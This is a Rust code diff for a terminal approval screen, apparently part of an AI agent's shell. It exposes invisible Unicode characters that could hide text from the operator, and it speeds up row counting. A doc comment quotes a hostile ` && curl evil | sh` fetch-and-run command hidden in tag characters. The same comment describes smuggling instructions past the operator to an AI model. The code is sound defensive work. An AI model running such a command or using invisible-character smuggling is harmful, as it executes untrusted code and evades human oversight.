@@ -47,45 +47,39 @@ pub(crate) fn is_tag(c: char) -> bool {
     ('\u{e0000}'..='\u{e007f}').contains(&c)
 }
 
-/// Whether `glyph` is a subdivision flag: the black flag, the subdivision's
-/// code in tag letters and digits — a region and up to four more, as
-/// `gbeng` — and the cancel tag that ends it. Tags any longer, or any other
-/// glyph holding them, carry text that is drawn as nothing.
+/// The subdivision flags Unicode recommends drawing, England's, Scotland's
+/// and Wales's: the black flag, the subdivision's code in tag letters and
+/// the cancel tag. Any other run of tags after the black flag draws as the
+/// black flag alone, and the letters in it are words nobody sees.
+const TAG_FLAGS: [&str; 3] = [
+    "\u{1f3f4}\u{e0067}\u{e0062}\u{e0065}\u{e006e}\u{e0067}\u{e007f}",
+    "\u{1f3f4}\u{e0067}\u{e0062}\u{e0073}\u{e0063}\u{e0074}\u{e007f}",
+    "\u{1f3f4}\u{e0067}\u{e0062}\u{e0077}\u{e006c}\u{e0073}\u{e007f}",
+];
+
+/// Whether `glyph` is one of the subdivision flags a terminal draws. Tags
+/// in any other glyph carry text that is drawn as nothing.
 pub(crate) fn is_tag_flag(glyph: &str) -> bool {
-    glyph.ends_with('\u{e007f}') && could_be_tag_flag(glyph)
+    TAG_FLAGS.contains(&glyph)
 }
 
-/// Whether `glyph` is a subdivision flag or the start of one, as a flag
+/// Whether `glyph` is one of those flags or the start of one, as a flag
 /// typed a key at a time is before its cancel tag arrives.
 pub(crate) fn could_be_tag_flag(glyph: &str) -> bool {
-    let Some(rest) = glyph.strip_prefix('\u{1f3f4}') else {
-        return false;
-    };
-    let (code, ended) = match rest.strip_suffix('\u{e007f}') {
-        Some(code) => (code, true),
-        None => (rest, false),
-    };
-    let letters = code.chars().count();
-    letters <= 6
-        && (!ended || letters >= 3)
-        && code
-            .chars()
-            .all(|c| matches!(c, '\u{e0030}'..='\u{e0039}' | '\u{e0061}'..='\u{e007a}'))
+    glyph.starts_with('\u{1f3f4}') && TAG_FLAGS.iter().any(|flag| flag.starts_with(glyph))
 }
 
 /// `text` with every control character in it shown rather than dropped: a C0
 /// control by its Control Pictures glyph (`␛` for an escape, `␤` for a line
-/// break, `␉` for a tab), DEL by `␡` and a C1 control by `�`.
+/// break, `␉` for a tab), DEL by `␡` and a C1 control by `�` — and every
+/// character that draws as nothing yet carries text by `�` too.
 ///
 /// For text the operator decides on, drawn on one line. Ratatui drops a
 /// control character without a trace, so a value holding an escape would read
 /// as the text around it, and a line break would start a row that looks like
 /// one of the shell's own.
 pub fn controls_shown(text: &str) -> std::borrow::Cow<'_, str> {
-    if !text.contains(char::is_control) {
-        return std::borrow::Cow::Borrowed(text);
-    }
-    std::borrow::Cow::Owned(text.chars().map(control_shown).collect())
+    shown_except(text, |_| false)
 }
 
 /// `text` with every control character shown but a line break and a tab,
@@ -98,17 +92,203 @@ pub fn controls_shown(text: &str) -> std::borrow::Cow<'_, str> {
 /// that is not the one that runs, and a carriage return would hide what
 /// precedes it on a terminal that honours one.
 pub fn controls_shown_in_rows(text: &str) -> std::borrow::Cow<'_, str> {
-    if !text.contains(|c: char| c.is_control() && !matches!(c, '\n' | '\t')) {
+    shown_except(text, |c| matches!(c, '\n' | '\t'))
+}
+
+/// `text` with each control character but those `kept` shown by
+/// [`control_shown`], and each character that draws as nothing yet carries
+/// text by `�`.
+///
+/// Both kinds draw in no cell. A control acts on the terminal or is dropped;
+/// a tag or an invisible format character is drawn as nothing, and a run of
+/// them spells words — `echo hi` with ` && curl evil | sh` in tags after it
+/// reads as `echo hi`, and a model given a file written so reads what the
+/// operator never saw. Tags that spell a subdivision flag draw that flag, and
+/// are kept within it.
+fn shown_except(text: &str, kept: impl Fn(char) -> bool) -> std::borrow::Cow<'_, str> {
+    // A question is drawn with every tick while it waits, over a write of
+    // megabytes, so text with nothing to show — nearly all of it, and nearly
+    // all ASCII — is passed a byte at a time where it can be, which the
+    // compiler runs many bytes at once; anything else is walked once a
+    // character at a time, never a grapheme at a time, which over megabytes
+    // took a second a frame.
+    let clean = match text.is_ascii() {
+        true => !text
+            .bytes()
+            .any(|b| b.is_ascii_control() && !kept(char::from(b))),
+        false => shown_where(text, &kept, None),
+    };
+    if clean {
         return std::borrow::Cow::Borrowed(text);
     }
-    std::borrow::Cow::Owned(
-        text.chars()
-            .map(|c| match c {
-                '\n' | '\t' => c,
-                c => control_shown(c),
-            })
-            .collect(),
-    )
+    let mut shown = String::with_capacity(text.len());
+    match text.is_ascii() {
+        true => ascii_shown(text, &kept, &mut shown),
+        false => {
+            shown_where(text, &kept, Some(&mut shown));
+        }
+    }
+    std::borrow::Cow::Owned(shown)
+}
+
+/// The ASCII `text` with each control in it but those `kept` shown, the
+/// rest copied a run at a time.
+fn ascii_shown(text: &str, kept: &impl Fn(char) -> bool, out: &mut String) {
+    let mut copied = 0;
+    for (at, byte) in text.bytes().enumerate() {
+        let c = char::from(byte);
+        if byte.is_ascii_control() && !kept(c) {
+            out.push_str(text.get(copied..at).unwrap_or_default());
+            out.push(control_shown(c));
+            copied = at + 1;
+        }
+    }
+    out.push_str(text.get(copied..).unwrap_or_default());
+}
+
+/// How many characters that take no cell may follow one that does before the
+/// rest are shown: an accent or two, an emoji's selector and the joiners of
+/// a family of four — and not a run that spells words in selectors, joiners
+/// or marks stacked out of sight.
+const ZERO_WIDTH_RUN: usize = 8;
+
+/// Walks `text` once, writing it with what is hidden in it shown into `out`
+/// where there is one, and says whether nothing in it was.
+fn shown_where(text: &str, kept: &impl Fn(char) -> bool, mut out: Option<&mut String>) -> bool {
+    use unicode_width::UnicodeWidthChar as _;
+
+    let mut clean = true;
+    let mut run = 0usize;
+    // The character before the one at hand, as it was in `text`, and the
+    // last one before it that takes a cell: a joiner after a selector or a
+    // virama joins the glyph before them.
+    let mut before: Option<char> = None;
+    let mut glyph: Option<char> = None;
+    // What of `text` is still to be copied into `out` as it stands, from here.
+    let mut copied = 0;
+    let mut chars = text.char_indices().peekable();
+    while let Some((at, c)) = chars.next() {
+        let shown = match c {
+            c if kept(c) => c,
+            '\u{1f3f4}' => {
+                // A subdivision flag is the black flag and the tags after it
+                // up to the cancel tag, which is one glyph, and is drawn.
+                let end = text
+                    .get(at..)
+                    .unwrap_or_default()
+                    .char_indices()
+                    .skip(1)
+                    .take_while(|(_, c)| is_tag(*c))
+                    .take(8)
+                    .last()
+                    .map_or(at + c.len_utf8(), |(i, c)| at + i + c.len_utf8());
+                let glyph = text.get(at..end).unwrap_or_default();
+                if is_tag_flag(glyph) {
+                    while chars.peek().is_some_and(|(i, _)| *i < end) {
+                        chars.next();
+                    }
+                    run = 0;
+                    continue;
+                }
+                c
+            }
+            c if c.is_control() => control_shown(c),
+            c if draws_nothing(c) => '\u{fffd}',
+            // A joiner shapes an emoji or a script only between two of
+            // their glyphs; anywhere else, beside a letter of ASCII or
+            // another joiner, it is drawn as nothing and carries a bit.
+            '\u{200c}' | '\u{200d}' => {
+                let after = chars.peek().map(|(_, c)| *c);
+                match (glyph.is_some_and(shapes), after.is_some_and(shapes)) {
+                    (true, true) => c,
+                    (true | false, false) | (false, true) => '\u{fffd}',
+                }
+            }
+            // A presentation selector selects how a glyph that has two looks
+            // is drawn: after an emoji, or a digit, `#` or `*` that a keycap
+            // follows. After anything else it selects nothing.
+            '\u{fe0e}' | '\u{fe0f}' => {
+                let after = chars.peek().map(|(_, c)| *c);
+                let keycap = before.is_some_and(|b| matches!(b, '0'..='9' | '#' | '*'))
+                    && after == Some('\u{20e3}');
+                match keycap || before.is_some_and(shapes) {
+                    true => c,
+                    false => '\u{fffd}',
+                }
+            }
+            c if c.width() == Some(0) => {
+                run = run.saturating_add(1);
+                match run > ZERO_WIDTH_RUN {
+                    true => '\u{fffd}',
+                    false => c,
+                }
+            }
+            c => {
+                run = 0;
+                c
+            }
+        };
+        before = Some(c);
+        if c.width().is_some_and(|w| w > 0) {
+            glyph = Some(c);
+        }
+        if shown != c {
+            clean = false;
+            let Some(out) = out.as_deref_mut() else {
+                return false;
+            };
+            out.push_str(text.get(copied..at).unwrap_or_default());
+            out.push(shown);
+            copied = at + c.len_utf8();
+        }
+    }
+    if let Some(out) = out {
+        out.push_str(text.get(copied..).unwrap_or_default());
+    }
+    clean
+}
+
+/// Whether `c` is a glyph past ASCII that takes a cell, beside which a joiner
+/// or a selector shapes what is drawn.
+fn shapes(c: char) -> bool {
+    use unicode_width::UnicodeWidthChar as _;
+
+    !c.is_ascii() && c.width().is_some_and(|w| w > 0)
+}
+
+/// Whether `c` draws in no cell and can carry text a reader is not shown: a
+/// tag outside the flag it spells, a variation selector that selects nothing
+/// a terminal draws — the sixteen but the two an emoji takes, and the
+/// supplement's — the zero-width space, the word joiner and the format
+/// characters after it, the byte order mark, the soft hyphen, the combining
+/// grapheme joiner, the Hangul fillers, the Khmer inherent vowels, the
+/// Mongolian selectors and vowel separator, and the shorthand and musical
+/// format controls.
+///
+/// The joiners an emoji or a script needs, U+200C and U+200D, and the two
+/// presentation selectors are left to the run of characters that take no
+/// cell: one or two of them shape what is drawn.
+pub(crate) fn draws_nothing(c: char) -> bool {
+    c >= '\u{ad}'
+        && matches!(
+            c,
+            '\u{ad}'
+                | '\u{34f}'
+                | '\u{115f}'
+                | '\u{1160}'
+                | '\u{17b4}'
+                | '\u{17b5}'
+                | '\u{180b}'..='\u{180f}'
+                | '\u{200b}'
+                | '\u{2060}'..='\u{206f}'
+                | '\u{3164}'
+                | '\u{fe00}'..='\u{fe0d}'
+                | '\u{feff}'
+                | '\u{ffa0}'
+                | '\u{1bca0}'..='\u{1bca3}'
+                | '\u{1d173}'..='\u{1d17a}'
+                | '\u{e0000}'..='\u{e0fff}'
+        )
 }
 
 /// What [`controls_shown`] draws in place of `c`.
@@ -422,10 +602,129 @@ pub fn wrap_exact_rows(text: &str, columns: usize) -> usize {
             match (line.is_empty(), line.is_ascii()) {
                 (true, _) => 1,
                 (false, true) => line.len().div_ceil(columns),
-                (false, false) => chunks_to_width(&line, columns).count(),
+                (false, false) => rows_of(&line, columns),
             }
         })
         .fold(0, usize::saturating_add)
+}
+
+/// How many rows [`chunks_to_width`] cuts `line` into, counted without
+/// cutting it: a run of ASCII is a cell a byte and is counted by arithmetic,
+/// and only what is not ASCII, with the byte on either side of it that a
+/// mark or a prefix can join to it, is walked by grapheme.
+///
+/// A question counts every row of what it would do on every frame, and one
+/// character past ASCII in a line of megabytes made that a walk of the whole
+/// line by grapheme, a third of a second a frame. `line` holds no control
+/// character or tab, which [`controls_shown_in_rows`] and the tab expansion
+/// have taken out, so every ASCII byte in it is a cell.
+fn rows_of(line: &str, columns: usize) -> usize {
+    let mut rows = Rows {
+        columns,
+        done: 0,
+        width: 0,
+        open: false,
+    };
+    let bytes = line.as_bytes();
+    let mut at = 0;
+    while at < bytes.len() {
+        let ascii = bytes
+            .get(at..)
+            .unwrap_or_default()
+            .iter()
+            .take_while(|b| b.is_ascii())
+            .count();
+        // The last byte of a run of ASCII goes with what follows it, which
+        // may be a mark that joins it, unless the line ends there.
+        let fast = match at + ascii == bytes.len() {
+            true => ascii,
+            false => ascii.saturating_sub(1),
+        };
+        rows.cells(fast);
+        at += fast;
+        let mut end = at;
+        while end < bytes.len() {
+            let next_ascii = bytes
+                .get(end..)
+                .unwrap_or_default()
+                .iter()
+                .take_while(|b| b.is_ascii())
+                .count();
+            match next_ascii {
+                // Not ASCII: on to its end.
+                0 => {
+                    end += line
+                        .get(end..)
+                        .and_then(|rest| rest.chars().next())
+                        .map_or(1, char::len_utf8)
+                }
+                // A byte or two of ASCII between what is not: walked with it,
+                // since a prefix before it or a mark after it can join it.
+                1 | 2 if end + next_ascii < bytes.len() => end += next_ascii,
+                // The first byte of a longer run goes with what came before,
+                // which may be a prefix that joins it.
+                _ => {
+                    end += 1;
+                    break;
+                }
+            }
+        }
+        if end > at {
+            for (_, w) in graphemes(line.get(at..end).unwrap_or_default()) {
+                rows.cell_of(w);
+            }
+            at = end;
+        }
+    }
+    rows.count()
+}
+
+/// The rows [`chunks_to_width`] would cut, counted a cell at a time.
+struct Rows {
+    columns: usize,
+    /// Rows already full.
+    done: usize,
+    /// The cells of the row being filled.
+    width: usize,
+    /// Whether that row holds anything.
+    open: bool,
+}
+
+impl Rows {
+    /// One grapheme `w` cells wide.
+    fn cell_of(&mut self, w: usize) {
+        if self.open && self.width + w > self.columns {
+            self.done += 1;
+            self.width = 0;
+        }
+        self.width += w;
+        self.open = true;
+    }
+
+    /// `n` graphemes a cell wide each.
+    fn cells(&mut self, n: usize) {
+        if n == 0 {
+            return;
+        }
+        if self.open && self.width >= self.columns {
+            self.done += 1;
+            self.width = 0;
+            self.open = false;
+        }
+        let room = self.columns - self.width;
+        if n <= room {
+            self.width += n;
+        } else {
+            let past = n - room;
+            self.done += 1 + (past - 1) / self.columns;
+            self.width = (past - 1) % self.columns + 1;
+        }
+        self.open = true;
+    }
+
+    fn count(&self) -> usize {
+        self.done + usize::from(self.open)
+    }
 }
 
 /// `line` as [`expand_tabs`] makes it, copied only where it has a tab.
@@ -1065,6 +1364,79 @@ mod tests {
         assert_eq!(truncate_start("ui.rs", 12), "ui.rs");
         assert_eq!(truncate_start("ui.rs", 1), "…");
         assert_eq!(truncate_start("ui.rs", 0), "");
+    }
+
+    /// What an approval draws holds no text that draws as nothing, and
+    /// changes nothing a script or an emoji needs to draw as it does.
+    #[test]
+    fn text_that_draws_as_nothing_is_shown_and_what_shapes_a_glyph_is_kept() {
+        let shown = |text: &str| controls_shown_in_rows(text).into_owned();
+        let selectors: String = "\u{fe00}\u{fe01}\u{fe02}\u{fe03}".repeat(10);
+
+        for hidden in [
+            format!("a{selectors}"),
+            "a\u{ad}b".to_owned(),
+            "a\u{34f}b".to_owned(),
+            "a\u{3164}b".to_owned(),
+            "a\u{1160}b".to_owned(),
+            "a\u{206a}b".to_owned(),
+            "a\u{1d173}b".to_owned(),
+            format!("a{}", "\u{200c}\u{200d}".repeat(10)),
+            format!("a{}", "\u{301}".repeat(300)),
+        ] {
+            assert!(shown(&hidden).contains('\u{fffd}'), "{hidden:?}");
+        }
+        for kept in [
+            "\u{2764}\u{fe0f}",
+            "\u{1f468}\u{200d}\u{1f469}\u{200d}\u{1f467}\u{200d}\u{1f466}",
+            "e\u{301}",
+            "\u{1f3f4}\u{e0067}\u{e0062}\u{e0065}\u{e006e}\u{e0067}\u{e007f}",
+            "\u{645}\u{200c}\u{6cc}",
+            "1\u{fe0f}\u{20e3}",
+            "\u{1f3f3}\u{fe0f}\u{200d}\u{1f308}",
+            "\u{915}\u{94d}\u{200d}\u{937}",
+            "\u{1f3f4}\u{e0067}\u{e0062}\u{e0077}\u{e006c}\u{e0073}\u{e007f}",
+        ] {
+            assert_eq!(shown(kept), kept, "{kept:?}");
+        }
+        for hidden in [
+            "api.anthro\u{200d}pic.com",
+            "ma\u{fe0f}in.rs",
+            "\u{4e2d}\u{200d}\u{200c}\u{6587}",
+            "\u{1f3f4}\u{e0063}\u{e0075}\u{e0072}\u{e006c}\u{e007f}",
+        ] {
+            assert!(shown(hidden).contains('\u{fffd}'), "{hidden:?}");
+        }
+    }
+
+    /// The rows a line is counted at are the rows it is cut into, whatever
+    /// joins across where the count stops walking by grapheme.
+    #[test]
+    fn a_line_is_counted_at_the_rows_it_is_cut_into() {
+        let samples = [
+            "plain ascii that wraps more than once at a narrow width",
+            "ab\u{301}cd e\u{301}\u{302}f",
+            "1\u{fe0f}\u{20e3} keycap after ascii",
+            "\u{600}12 a prefix before digits",
+            "中文字符 and ascii 混合 text 和 more",
+            "x\u{1f468}\u{200d}\u{1f469}\u{200d}\u{1f467}y z",
+            "\u{1f1e9}\u{1f1ea}\u{1f1eb}\u{1f1f7} flags",
+            "a\u{2424}b",
+            "\u{fffd}",
+            "",
+        ];
+        for sample in samples {
+            for columns in 1..12 {
+                let line = format!("{sample}{}", "w".repeat(columns * 3));
+                for text in [sample.to_owned(), line] {
+                    assert_eq!(
+                        rows_of(&text, columns),
+                        chunks_to_width(&text, columns).count(),
+                        "{text:?} at {columns}"
+                    );
+                }
+            }
+        }
     }
 
     #[test]
